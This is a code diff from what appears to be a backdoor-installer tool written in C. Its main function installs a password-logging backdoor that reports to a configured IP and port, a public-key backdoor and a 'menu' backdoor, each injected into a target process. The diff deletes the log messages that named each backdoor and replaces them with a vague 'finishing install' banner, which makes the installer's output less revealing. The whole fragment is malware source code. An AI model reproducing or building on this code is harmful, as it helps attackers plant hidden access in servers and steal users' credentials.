@@ -140,18 +140,11 @@ int main(int argc, char *argv[]) {
 
 	// install backdoor(s)
 	if(config->net_type != 0) {
-		info(
-			"installing passlogger backdoor for [0x%08x:0x%04x] (%s)..", 
-			config->ip_addr, config->port, (config->net_type == 1) ? "TCP" : "UDP"
-		);
-
 		backdoor_password_install(ctx);
 		inject_ctx_map_reload(ctx);
 	}
 
 	if (pubkey_value != NULL || pubkey_file != NULL) {
-		info("installing pubkey backdoor..");
-
 		if (pubkey_file != NULL) {
 			FILE *f = fopen(pubkey_file, "rb");
 
@@ -185,11 +178,11 @@ int main(int argc, char *argv[]) {
 	}
 
 	if (menu_activate) {
-		info("installing menu backdoor..");
-
 		backdoor_menu_install(ctx);
 		inject_ctx_map_reload(ctx);
 	}
+
+	mod_banner("finishing install");
 
 	// upload config data
 	info("uploading config..");
